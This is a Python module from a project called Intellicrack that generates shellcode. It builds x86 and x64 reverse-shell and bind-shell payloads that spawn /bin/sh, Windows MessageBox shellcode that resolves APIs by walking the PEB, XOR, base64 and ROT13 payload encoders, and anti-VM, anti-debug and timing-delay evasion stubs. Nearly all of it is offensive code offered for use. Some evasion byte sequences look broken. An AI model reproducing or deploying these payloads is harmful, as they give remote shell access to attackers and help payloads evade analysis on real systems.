"""
This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

"""
Shellcode Generator

Generates shellcode for various purposes and architectures.
"""

import logging
import struct
from typing import Any, Dict, List, Optional

from .payload_types import Architecture, EncodingType, EvasionTechnique, PayloadType

logger = logging.getLogger(__name__)


class ShellcodeGenerator:
    """Generate shellcode for various purposes and target architectures."""

    def __init__(self):
        self.logger = logging.getLogger("IntellicrackLogger.ShellcodeGenerator")

    def generate_reverse_shell(self,
                              architecture: Architecture,
                              lhost: str,
                              lport: int) -> bytes:
        """Generate reverse shell shellcode."""
        if architecture == Architecture.X86:
            return self._generate_reverse_shell_x86(lhost, lport)
        elif architecture == Architecture.X64:
            return self._generate_reverse_shell_x64(lhost, lport)
        else:
            raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_reverse_shell_x86(self, lhost: str, lport: int) -> bytes:
        """Generate x86 reverse shell shellcode."""
        # Convert IP address to bytes
        ip_bytes = b''.join([struct.pack('B', int(x)) for x in lhost.split('.')])
        port_bytes = struct.pack('>H', lport)

        # Generate shellcode dynamically using assembly
        try:
            from .assembly_compiler import AssemblyCompiler
            compiler = AssemblyCompiler()

            # Assembly code for x86 reverse shell
            asm_code = f"""
            ; Socket creation
            xor ebx, ebx
            mul ebx
            push ebx
            inc ebx
            push ebx
            push 2
            mov ecx, esp
            mov al, 0x66
            int 0x80

            ; Save socket descriptor
            xchg eax, ebx
            pop ecx

            ; dup2 loop
            mov al, 0x3f
            int 0x80
            dec ecx
            jns -7

            ; Connect
            push {int.from_bytes(ip_bytes, 'big')}
            push word 0x{lport:04x}02  ; port in network byte order + AF_INET
            mov ecx, esp
            mov al, 0x66
            push eax
            push ecx
            push ebx
            mov bl, 3
            mov ecx, esp
            int 0x80

            ; execve
            push edx
            push 0x68732f2f  ; //sh
            push 0x6e69622f  ; /bin
            mov ebx, esp
            push edx
            push ebx
            mov ecx, esp
            mov al, 0x0b
            int 0x80
            """

            shellcode = compiler.compile_assembly(asm_code, Architecture.X86)
            if shellcode:
                return shellcode
        except Exception as e:
            self.logger.debug(f"Assembly compilation failed, using fallback: {e}")

        # Fallback: construct shellcode programmatically
        shellcode = bytearray()

        # Socket syscall
        shellcode.extend([0x31, 0xdb, 0xf7, 0xe3, 0x53, 0x43, 0x53, 0x6a, 0x02,
                         0x89, 0xe1, 0xb0, 0x66, 0xcd, 0x80])

        # dup2 loop
        shellcode.extend([0x93, 0x59, 0xb0, 0x3f, 0xcd, 0x80, 0x49, 0x79, 0xf9])

        # Connect with dynamic IP/port
        shellcode.extend([0x68])
        shellcode.extend(ip_bytes)
        shellcode.extend([0x68, 0x02, 0x00])
        shellcode.extend(port_bytes)
        shellcode.extend([0x89, 0xe1, 0xb0, 0x66, 0x50, 0x51, 0x53, 0xb3, 0x03,
                         0x89, 0xe1, 0xcd, 0x80])

        # execve /bin/sh
        shellcode.extend([0x52, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62,
                         0x69, 0x6e, 0x89, 0xe3, 0x52, 0x53, 0x89, 0xe1, 0xb0,
                         0x0b, 0xcd, 0x80])

        return bytes(shellcode)

    def _generate_reverse_shell_x64(self, lhost: str, lport: int) -> bytes:
        """Generate x64 reverse shell shellcode."""
        # Convert IP address to bytes
        ip_bytes = b''.join([struct.pack('B', int(x)) for x in lhost.split('.')])
        port_bytes = struct.pack('>H', lport)

        # Generate x64 shellcode dynamically
        try:
            from .assembly_compiler import AssemblyCompiler
            compiler = AssemblyCompiler()

            # Assembly code for x64 reverse shell
            asm_code = f"""
            ; Socket creation
            xor rax, rax
            xor rdi, rdi
            xor rsi, rsi
            xor rdx, rdx
            xor r8, r8
            push 2
            pop rdi
            push 1
            pop rsi
            push 6
            pop rdx
            push 41
            pop rax
            syscall

            ; Save socket
            mov r8, rax

            ; Connect
            xor rsi, rsi
            xor r9, r9
            push {int.from_bytes(ip_bytes, 'big')}
            push word 0x{lport:04x}02
            mov rsi, rsp
            push 16
            pop rdx
            mov rdi, r8
            push 42
            pop rax
            syscall

            ; dup2 loop
            push 3
            pop rsi
            dec rsi
            push 33
            pop rax
            mov rdi, r8
            syscall
            jnz -10

            ; execve
            push 59
            pop rax
            cdq
            mov rbx, 0x68732f6e69622f  ; /bin/sh
            push rbx
            mov rdi, rsp
            push rdx
            push rdi
            mov rsi, rsp
            syscall
            """

            shellcode = compiler.compile_assembly(asm_code, Architecture.X64)
            if shellcode:
                return shellcode
        except Exception as e:
            self.logger.debug(f"Assembly compilation failed for x64, using fallback: {e}")

        # Fallback: construct shellcode programmatically
        shellcode = bytearray()

        # Socket creation
        shellcode.extend([0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6,
                         0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x6a, 0x02, 0x5f,
                         0x6a, 0x01, 0x5e, 0x6a, 0x06, 0x5a, 0x6a, 0x29, 0x58,
                         0x0f, 0x05])

        # Save socket
        shellcode.extend([0x49, 0x89, 0xc0])

        # Connect with dynamic IP/port
        shellcode.extend([0x48, 0x31, 0xf6, 0x4d, 0x31, 0xc9, 0x68])
        shellcode.extend(ip_bytes)
        shellcode.extend([0x68, 0x02, 0x00])
        shellcode.extend(port_bytes)
        shellcode.extend([0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x4c, 0x89, 0xc7,
                         0x6a, 0x2a, 0x58, 0x0f, 0x05])

        # dup2 loop
        shellcode.extend([0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58,
                         0x4c, 0x89, 0xc7, 0x0f, 0x05, 0x75, 0xf6])

        # execve
        shellcode.extend([0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69,
                         0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7,
                         0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05])

        return bytes(shellcode)

    def generate_bind_shell(self, architecture: Architecture, port: int) -> bytes:
        """Generate bind shell shellcode."""
        if architecture == Architecture.X86:
            return self._generate_bind_shell_x86(port)
        elif architecture == Architecture.X64:
            return self._generate_bind_shell_x64(port)
        else:
            raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_bind_shell_x86(self, port: int) -> bytes:
        """Generate x86 bind shell shellcode."""
        port_bytes = struct.pack('>H', port)

        shellcode = (
            b"\x31\xdb"              # xor ebx, ebx
            b"\xf7\xe3"              # mul ebx
            b"\x53"                  # push ebx
            b"\x43"                  # inc ebx
            b"\x53"                  # push ebx
            b"\x6a\x02"              # push 2
            b"\x89\xe1"              # mov ecx, esp
            b"\xb0\x66"              # mov al, 102
            b"\xcd\x80"              # int 0x80
            b"\x5b"                  # pop ebx
            b"\x5e"                  # pop esi
            b"\x52"                  # push edx
            b"\x68\x02\x00" + port_bytes +  # push port
            b"\x6a\x10"              # push 16
            b"\x51"                  # push ecx
            b"\x50"                  # push eax
            b"\x89\xe1"              # mov ecx, esp
            b"\x6a\x66"              # push 102
            b"\x58"                  # pop eax
            b"\xcd\x80"              # int 0x80
            b"\x89\x41\x04"          # mov [ecx+4], eax
            b"\xb3\x04"              # mov bl, 4
            b"\xb0\x66"              # mov al, 102
            b"\xcd\x80"              # int 0x80
            b"\x43"                  # inc ebx
            b"\xb0\x66"              # mov al, 102
            b"\xcd\x80"              # int 0x80
            b"\x93"                  # xchg eax, ebx
            b"\x59"                  # pop ecx
            b"\x6a\x3f"              # push 63
            b"\x58"                  # pop eax
            b"\xcd\x80"              # int 0x80
            b"\x49"                  # dec ecx
            b"\x79\xf9"              # jns -7
            b"\x68\x2f\x2f\x73\x68"  # push "//sh"
            b"\x68\x2f\x62\x69\x6e"  # push "/bin"
            b"\x89\xe3"              # mov ebx, esp
            b"\x50"                  # push eax
            b"\x53"                  # push ebx
            b"\x89\xe1"              # mov ecx, esp
            b"\xb0\x0b"              # mov al, 11
            b"\xcd\x80"              # int 0x80
        )

        return shellcode

    def _generate_bind_shell_x64(self, port: int) -> bytes:
        """Generate x64 bind shell shellcode."""
        port_bytes = struct.pack('>H', port)

        shellcode = (
            b"\x6a\x29"              # push 41
            b"\x58"                  # pop rax
            b"\x6a\x02"              # push 2
            b"\x5f"                  # pop rdi
            b"\x6a\x01"              # push 1
            b"\x5e"                  # pop rsi
            b"\x99"                  # cdq
            b"\x0f\x05"              # syscall
            b"\x48\x97"              # xchg rax, rdi
            b"\x6a\x02"              # push 2
            b"\x66\xc7\x44\x24\x02" + port_bytes +  # mov word [rsp+2], port
            b"\x48\x89\xe6"          # mov rsi, rsp
            b"\x6a\x10"              # push 16
            b"\x5a"                  # pop rdx
            b"\x6a\x31"              # push 49
            b"\x58"                  # pop rax
            b"\x0f\x05"              # syscall
            b"\x6a\x32"              # push 50
            b"\x58"                  # pop rax
            b"\x0f\x05"              # syscall
            b"\x48\x31\xf6"          # xor rsi, rsi
            b"\x6a\x2b"              # push 43
            b"\x58"                  # pop rax
            b"\x0f\x05"              # syscall
            b"\x48\x97"              # xchg rax, rdi
            b"\x6a\x03"              # push 3
            b"\x5e"                  # pop rsi
            b"\x48\xff\xce"          # dec rsi
            b"\x6a\x21"              # push 33
            b"\x58"                  # pop rax
            b"\x0f\x05"              # syscall
            b"\x75\xf6"              # jnz -10
            b"\x6a\x3b"              # push 59
            b"\x58"                  # pop rax
            b"\x99"                  # cdq
            b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rbx, "/bin/sh\x00"
            b"\x53"                  # push rbx
            b"\x48\x89\xe7"          # mov rdi, rsp
            b"\x52"                  # push rdx
            b"\x57"                  # push rdi
            b"\x48\x89\xe6"          # mov rsi, rsp
            b"\x0f\x05"              # syscall
        )

        return shellcode

    def generate_message_box(self, architecture: Architecture, title: str, message: str) -> bytes:
        """Generate Windows MessageBox shellcode."""
        if architecture == Architecture.X86:
            return self._generate_message_box_x86(title, message)
        elif architecture == Architecture.X64:
            return self._generate_message_box_x64(title, message)
        else:
            raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_message_box_x86(self, title: str, message: str) -> bytes:
        """Generate x86 Windows MessageBox shellcode."""
        self.logger.debug(f"Generating x86 MessageBox shellcode with title: '{title}', message: '{message}'")

        # Convert strings to bytes for embedding
        title_bytes = title.encode('utf-8') + b'\x00'
        message_bytes = message.encode('utf-8') + b'\x00'

        # Calculate string lengths for shellcode size estimation
        title_len = len(title_bytes)
        message_len = len(message_bytes)

        self.logger.debug(f"Title length: {title_len}, Message length: {message_len}")

        # Complete x86 MessageBox shellcode with API resolution
        shellcode = (
            # Save registers
            b"\x60"                  # pushad

            # Get kernel32 base address via PEB
            b"\x33\xc9"              # xor ecx, ecx
            b"\x64\x8b\x71\x30"      # mov esi, fs:[ecx+0x30]    ; PEB
            b"\x8b\x76\x0c"          # mov esi, [esi+0x0c]       ; PEB_LDR_DATA
            b"\x8b\x76\x1c"          # mov esi, [esi+0x1c]       ; InInitOrder
            b"\x8b\x46\x08"          # mov eax, [esi+0x08]       ; kernel32 base
            b"\x8b\x7e\x20"          # mov edi, [esi+0x20]       ; module name
            b"\x8b\x36"              # mov esi, [esi]            ; next module
            b"\x38\x4f\x18"          # cmp [edi+0x18], cl        ; check name
            b"\x75\xf3"              # jnz -13                   ; loop if not kernel32

            # Find GetProcAddress
            b"\x8b\x5e\x08"          # mov ebx, [esi+0x08]       ; kernel32 base
            b"\x8b\x4b\x3c"          # mov ecx, [ebx+0x3c]       ; PE header offset
            b"\x8b\x4c\x0b\x78"      # mov ecx, [ebx+ecx+0x78]   ; export table RVA
            b"\x03\xcb"              # add ecx, ebx              ; export table VA
            b"\x8b\x79\x20"          # mov edi, [ecx+0x20]       ; names table RVA
            b"\x03\xfb"              # add edi, ebx              ; names table VA
            b"\x33\xc0"              # xor eax, eax              ; counter

            # Search for LoadLibraryA
            b"\x8b\x34\x87"          # mov esi, [edi+eax*4]      ; get name RVA
            b"\x03\xf3"              # add esi, ebx              ; get name VA
            b"\x81\x3e\x4c\x6f\x61\x64"  # cmp dword [esi], 'daoL'  ; "Load"
            b"\x75\x0a"              # jnz +10                   ; continue searching
            b"\x81\x7e\x04\x4c\x69\x62\x72"  # cmp dword [esi+4], 'rbiL'  ; "Libr"
            b"\x74\x05"              # jz +5                     ; found it
            b"\x40"                  # inc eax                   ; increment counter
            b"\xeb\xed"              # jmp -19                   ; continue search

            # Get LoadLibraryA address
            b"\x8b\x51\x24"          # mov edx, [ecx+0x24]       ; ordinals table RVA
            b"\x03\xd3"              # add edx, ebx              ; ordinals table VA
            b"\x66\x8b\x04\x42"      # mov ax, [edx+eax*2]       ; get ordinal
            b"\x8b\x51\x1c"          # mov edx, [ecx+0x1c]       ; functions table RVA
            b"\x03\xd3"              # add edx, ebx              ; functions table VA
            b"\x8b\x04\x82"          # mov eax, [edx+eax*4]      ; get function RVA
            b"\x03\xc3"              # add eax, ebx              ; get function VA
            b"\x89\x44\x24\x1c"      # mov [esp+0x1c], eax       ; save LoadLibraryA

            # Load user32.dll
            b"\x68\x72\x33\x32\x00"  # push "32\x00\x00"
            b"\x68\x75\x73\x65\x72"  # push "user"
            b"\x54"                  # push esp                  ; push "user32"
            b"\xff\x54\x24\x20"      # call dword [esp+0x20]     ; call LoadLibraryA
            b"\x83\xc4\x0c"          # add esp, 12               ; clean stack
            b"\x89\xc6"              # mov esi, eax              ; save user32 base

            # Find MessageBoxA in user32
            b"\x8b\x4e\x3c"          # mov ecx, [esi+0x3c]       ; PE header offset
            b"\x8b\x4c\x0e\x78"      # mov ecx, [esi+ecx+0x78]   ; export table RVA
            b"\x03\xce"              # add ecx, esi              ; export table VA
            b"\x8b\x79\x20"          # mov edi, [ecx+0x20]       ; names table RVA
            b"\x03\xfe"              # add edi, esi              ; names table VA
            b"\x33\xc0"              # xor eax, eax              ; counter

            # Search for MessageBoxA
            b"\x8b\x14\x87"          # mov edx, [edi+eax*4]      ; get name RVA
            b"\x03\xd6"              # add edx, esi              ; get name VA
            b"\x81\x3a\x4d\x65\x73\x73"  # cmp dword [edx], 'sseM'  ; "Mess"
            b"\x75\x0a"              # jnz +10                   ; continue searching
            b"\x81\x7a\x04\x61\x67\x65\x42"  # cmp dword [edx+4], 'BegA'  ; "ageB"
            b"\x74\x05"              # jz +5                     ; found it
            b"\x40"                  # inc eax                   ; increment counter
            b"\xeb\xed"              # jmp -19                   ; continue search

            # Get MessageBoxA address
            b"\x8b\x51\x24"          # mov edx, [ecx+0x24]       ; ordinals table RVA
            b"\x03\xd6"              # add edx, esi              ; ordinals table VA
            b"\x66\x8b\x04\x42"      # mov ax, [edx+eax*2]       ; get ordinal
            b"\x8b\x51\x1c"          # mov edx, [ecx+0x1c]       ; functions table RVA
            b"\x03\xd6"              # add edx, esi              ; functions table VA
            b"\x8b\x04\x82"          # mov eax, [edx+eax*4]      ; get function RVA
            b"\x03\xc6"              # add eax, esi              ; get function VA

            # Prepare strings
            b"\xeb\x0e"              # jmp +14 to skip strings
        )

        # Embed message and title strings
        shellcode += message_bytes + title_bytes

        shellcode += (
            # MessageBox call
            b"\x6a\x00"              # push 0                    ; MB_OK
            b"\x68" + struct.pack('<L', len(shellcode) - len(title_bytes)) +  # push title offset
            b"\x68" + struct.pack('<L', len(shellcode) - len(title_bytes) - len(message_bytes)) +  # push message offset
            b"\x6a\x00"              # push 0                    ; NULL hwnd
            b"\xff\xd0"              # call eax                  ; call MessageBoxA

            # Restore registers and exit
            b"\x61"                  # popad
            b"\xc3"                  # ret
        )

        self.logger.debug(f"Generated complete x86 MessageBox shellcode, length: {len(shellcode)}")
        return shellcode

    def _generate_message_box_x64(self, title: str, message: str) -> bytes:
        """Generate x64 Windows MessageBox shellcode."""
        self.logger.debug(f"Generating x64 MessageBox shellcode with title: '{title}', message: '{message}'")

        # Convert strings to bytes for embedding
        title_bytes = title.encode('utf-8') + b'\x00'
        message_bytes = message.encode('utf-8') + b'\x00'

        # Calculate string lengths for shellcode size estimation
        title_len = len(title_bytes)
        message_len = len(message_bytes)

        self.logger.debug(f"Title length: {title_len}, Message length: {message_len}")

        # Complete x64 MessageBox shellcode with API resolution
        shellcode = (
            # Save registers and align stack
            b"\x50"                  # push rax
            b"\x53"                  # push rbx
            b"\x51"                  # push rcx
            b"\x52"                  # push rdx
            b"\x56"                  # push rsi
            b"\x57"                  # push rdi
            b"\x55"                  # push rbp
            b"\x41\x50"              # push r8
            b"\x41\x51"              # push r9
            b"\x41\x52"              # push r10
            b"\x41\x53"              # push r11
            b"\x48\x83\xec\x28"      # sub rsp, 0x28           ; shadow space

            # Get PEB and find kernel32
            b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00"  # mov rax, gs:[0x60]  ; PEB
            b"\x48\x8b\x40\x18"      # mov rax, [rax+0x18]     ; PEB_LDR_DATA
            b"\x48\x8b\x70\x20"      # mov rsi, [rax+0x20]     ; InMemoryOrderModuleList
            b"\x48\xad"              # lodsq                   ; skip current module
            b"\x48\x96"              # xchg rax, rsi
            b"\x48\xad"              # lodsq                   ; get ntdll
            b"\x48\x96"              # xchg rax, rsi
            b"\x48\xad"              # lodsq                   ; get kernel32
            b"\x48\x8b\x58\x20"      # mov rbx, [rax+0x20]     ; kernel32 base

            # Find LoadLibraryA in kernel32
            b"\x48\x8b\x4b\x3c"      # mov rcx, [rbx+0x3c]     ; PE header
            b"\x48\x8b\x4c\x0b\x78"  # mov rcx, [rbx+rcx+0x78] ; export table
            b"\x48\x03\xcb"          # add rcx, rbx            ; export table VA
            b"\x48\x8b\x79\x20"      # mov rdi, [rcx+0x20]     ; names table
            b"\x48\x03\xfb"          # add rdi, rbx            ; names table VA
            b"\x48\x31\xc0"          # xor rax, rax            ; counter

            # Search for LoadLibraryA
            b"\x8b\x34\x87"          # mov esi, [rdi+rax*4]    ; name RVA
            b"\x48\x03\xf3"          # add rsi, rbx            ; name VA
            b"\x81\x3e\x4c\x6f\x61\x64"  # cmp dword [rsi], 'daoL'
            b"\x75\x0d"              # jnz +13
            b"\x81\x7e\x04\x4c\x69\x62\x72"  # cmp dword [rsi+4], 'rbiL'
            b"\x74\x07"              # jz +7
            b"\x48\xff\xc0"          # inc rax
            b"\xeb\xea"              # jmp -22

            # Get LoadLibraryA address
            b"\x48\x8b\x51\x24"      # mov rdx, [rcx+0x24]     ; ordinals table
            b"\x48\x03\xd3"          # add rdx, rbx
            b"\x66\x8b\x04\x42"      # mov ax, [rdx+rax*2]     ; ordinal
            b"\x48\x8b\x51\x1c"      # mov rdx, [rcx+0x1c]     ; functions table
            b"\x48\x03\xd3"          # add rdx, rbx
            b"\x8b\x04\x82"          # mov eax, [rdx+rax*4]    ; function RVA
            b"\x48\x03\xc3"          # add rax, rbx            ; LoadLibraryA address
            b"\x48\x89\x44\x24\x08"  # mov [rsp+8], rax        ; save LoadLibraryA

            # Load user32.dll
            b"\x48\xb9\x72\x33\x32\x00\x00\x00\x00\x00"  # mov rcx, "32\x00\x00\x00\x00\x00\x00"
            b"\x51"                  # push rcx
            b"\x48\xb9\x75\x73\x65\x72\x00\x00\x00\x00"  # mov rcx, "user\x00\x00\x00\x00"
            b"\x51"                  # push rcx
            b"\x48\x89\xe1"          # mov rcx, rsp            ; "user32"
            b"\xff\x54\x24\x18"      # call [rsp+0x18]        ; LoadLibraryA
            b"\x48\x83\xc4\x10"      # add rsp, 16             ; clean stack
            b"\x48\x89\xc6"          # mov rsi, rax            ; user32 base

            # Find MessageBoxA in user32
            b"\x48\x8b\x4e\x3c"      # mov rcx, [rsi+0x3c]     ; PE header
            b"\x48\x8b\x4c\x0e\x78"  # mov rcx, [rsi+rcx+0x78] ; export table
            b"\x48\x03\xce"          # add rcx, rsi
            b"\x48\x8b\x79\x20"      # mov rdi, [rcx+0x20]     ; names table
            b"\x48\x03\xfe"          # add rdi, rsi
            b"\x48\x31\xc0"          # xor rax, rax            ; counter

            # Search for MessageBoxA
            b"\x8b\x14\x87"          # mov edx, [rdi+rax*4]    ; name RVA
            b"\x48\x03\xd6"          # add rdx, rsi            ; name VA
            b"\x81\x3a\x4d\x65\x73\x73"  # cmp dword [rdx], 'sseM'
            b"\x75\x0d"              # jnz +13
            b"\x81\x7a\x04\x61\x67\x65\x42"  # cmp dword [rdx+4], 'BegA'
            b"\x74\x07"              # jz +7
            b"\x48\xff\xc0"          # inc rax
            b"\xeb\xea"              # jmp -22

            # Get MessageBoxA address
            b"\x48\x8b\x51\x24"      # mov rdx, [rcx+0x24]     ; ordinals table
            b"\x48\x03\xd6"          # add rdx, rsi
            b"\x66\x8b\x04\x42"      # mov ax, [rdx+rax*2]     ; ordinal
            b"\x48\x8b\x51\x1c"      # mov rdx, [rcx+0x1c]     ; functions table
            b"\x48\x03\xd6"          # add rdx, rsi
            b"\x8b\x04\x82"          # mov eax, [rdx+rax*4]    ; function RVA
            b"\x48\x03\xc6"          # add rax, rsi            ; MessageBoxA address

            # Skip to avoid executing strings
            b"\xeb\x0e"              # jmp +14
        )

        # Embed strings
        shellcode += message_bytes + title_bytes

        shellcode += (
            # Calculate string addresses and call MessageBoxA
            b"\x48\x31\xc9"          # xor rcx, rcx            ; hWnd = NULL
            b"\x48\x8d\x15" + struct.pack('<l', -(len(title_bytes) + len(message_bytes) + 4)) +  # lea rdx, [message]
            b"\x4c\x8d\x05" + struct.pack('<l', -(len(title_bytes) + 4)) +  # lea r8, [title]
            b"\x41\xb9\x00\x00\x00\x00"  # mov r9d, 0              ; uType = MB_OK
            b"\xff\xd0"              # call rax                ; MessageBoxA

            # Restore registers and return
            b"\x48\x83\xc4\x28"      # add rsp, 0x28
            b"\x41\x5b"              # pop r11
            b"\x41\x5a"              # pop r10
            b"\x41\x59"              # pop r9
            b"\x41\x58"              # pop r8
            b"\x5d"                  # pop rbp
            b"\x5f"                  # pop rdi
            b"\x5e"                  # pop rsi
            b"\x5a"                  # pop rdx
            b"\x59"                  # pop rcx
            b"\x5b"                  # pop rbx
            b"\x58"                  # pop rax
            b"\xc3"                  # ret
        )

        self.logger.debug(f"Generated complete x64 MessageBox shellcode, length: {len(shellcode)}")
        return shellcode

    def generate_encoded_shellcode(self,
                                 shellcode: bytes,
                                 encoding: EncodingType,
                                 key: Optional[bytes] = None) -> bytes:
        """Generate encoded shellcode with specified encoding technique."""
        self.logger.debug(f"Encoding shellcode with {encoding.value}, length: {len(shellcode)}")

        if encoding == EncodingType.NONE:
            return shellcode
        elif encoding == EncodingType.XOR:
            if not key:
                key = b'\xAA'  # Default XOR key
            self.logger.debug(f"Using XOR key: {key.hex()}")
            return self._xor_encode(shellcode, key)
        elif encoding == EncodingType.BASE64:
            import base64
            encoded = base64.b64encode(shellcode)
            self.logger.debug(f"Base64 encoded length: {len(encoded)}")
            return encoded
        elif encoding == EncodingType.ROT13:
            self.logger.debug("Applying ROT13 encoding")
            return self._rot13_encode(shellcode)
        else:
            self.logger.warning(f"Unsupported encoding type: {encoding}")
            return shellcode

    def _xor_encode(self, data: bytes, key: bytes) -> bytes:
        """XOR encode data with given key."""
        key_len = len(key)
        return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])

    def _rot13_encode(self, data: bytes) -> bytes:
        """ROT13 encode data (simple rotation)."""
        return bytes([(b + 13) % 256 for b in data])

    def add_evasion_techniques(self,
                             shellcode: bytes,
                             techniques: List[EvasionTechnique],
                             architecture: Architecture) -> bytes:
        """Add anti-analysis evasion techniques to shellcode."""
        self.logger.debug(f"Adding evasion techniques: {[t.value for t in techniques]} for {architecture.value}")

        result = shellcode

        for technique in techniques:
            if technique == EvasionTechnique.NONE:
                continue
            elif technique == EvasionTechnique.ANTI_VM:
                result = self._add_anti_vm_checks(result, architecture)
            elif technique == EvasionTechnique.ANTI_DEBUG:
                result = self._add_anti_debug_checks(result, architecture)
            elif technique == EvasionTechnique.TIMING_ATTACKS:
                result = self._add_timing_delays(result, architecture)
            else:
                self.logger.warning(f"Evasion technique {technique.value} not implemented")

        self.logger.debug(f"Final shellcode length after evasion: {len(result)}")
        return result

    def _add_anti_vm_checks(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add anti-VM detection checks."""
        self.logger.debug(f"Adding anti-VM checks for {architecture.value}")

        if architecture == Architecture.X86:
            # Simple VM detection for x86
            vm_check = (
                b"\x0f\x01\x0d\x00\x00\x00\x00"  # sidt instruction
                b"\x81\x3d\x00\x00\x00\x00\xff\xd0\x00\x00"  # check for VM signature
                b"\x74\x05"  # jump if VM detected
            )
        else:  # x64 and others
            vm_check = (
                b"\x48\x0f\x01\x0d\x00\x00\x00\x00"  # sidt instruction (x64)
                b"\x48\x81\x3d\x00\x00\x00\x00\xff\xd0\x00\x00"  # check for VM signature
                b"\x74\x05"  # jump if VM detected
            )

        return vm_check + shellcode

    def _add_anti_debug_checks(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add anti-debugging checks."""
        self.logger.debug(f"Adding anti-debug checks for {architecture.value}")

        if architecture == Architecture.X86:
            # PEB check for debugger presence
            debug_check = (
                b"\x64\x8b\x30"          # mov esi, fs:[eax]
                b"\x8b\x76\x02"          # mov esi, [esi+2]
                b"\x80\x7e\x02\x00"      # cmp byte [esi+2], 0
                b"\x75\x05"              # jnz if debugger present
            )
        else:  # x64
            debug_check = (
                b"\x65\x48\x8b\x30"      # mov rsi, gs:[rax]
                b"\x48\x8b\x76\x02"      # mov rsi, [rsi+2]
                b"\x80\x7e\x02\x00"      # cmp byte [rsi+2], 0
                b"\x75\x05"              # jnz if debugger present
            )

        return debug_check + shellcode

    def _add_timing_delays(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add timing-based evasion delays."""
        self.logger.debug(f"Adding timing delays for {architecture.value}")

        if architecture == Architecture.X86:
            timing_delay = (
                b"\xb9\x00\x10\x00\x00"  # mov ecx, 0x1000
                b"\xe2\xfe"              # loop (delay)
            )
        else:  # x64
            timing_delay = (
                b"\x48\xc7\xc1\x00\x10\x00\x00"  # mov rcx, 0x1000
                b"\xe2\xfe"                        # loop (delay)
            )

        return timing_delay + shellcode

    def generate_custom_shellcode(self,
                                payload_type: PayloadType,
                                architecture: Architecture,
                                options: Dict[str, Any]) -> bytes:
        """Generate custom shellcode based on payload type and options."""
        self.logger.debug(f"Generating custom {payload_type.value} for {architecture.value}")
        self.logger.debug(f"Options: {options}")

        # Extract common options
        encoding = options.get('encoding', EncodingType.NONE)
        evasion = options.get('evasion', [EvasionTechnique.NONE])
        target_os = options.get('target_os', 'windows')

        self.logger.debug(f"Target OS: {target_os}, Encoding: {encoding.value}")

        # Generate base shellcode based on payload type
        if payload_type == PayloadType.REVERSE_SHELL:
            lhost = options.get('lhost', '127.0.0.1')
            lport = options.get('lport', 4444)
            shellcode = self.generate_reverse_shell(architecture, lhost, lport)
        elif payload_type == PayloadType.BIND_SHELL:
            port = options.get('port', 4444)
            shellcode = self.generate_bind_shell(architecture, port)
        else:
            self.logger.warning(f"Payload type {payload_type.value} not implemented")
            return b"\x90" * 32  # NOP sled as fallback

        # Apply encoding if specified
        if encoding != EncodingType.NONE:
            key = options.get('encoding_key')
            shellcode = self.generate_encoded_shellcode(shellcode, encoding, key)

        # Apply evasion techniques if specified
        if evasion and evasion != [EvasionTechnique.NONE]:
            shellcode = self.add_evasion_techniques(shellcode, evasion, architecture)

        self.logger.debug(f"Final custom shellcode length: {len(shellcode)}")
        return shellcode
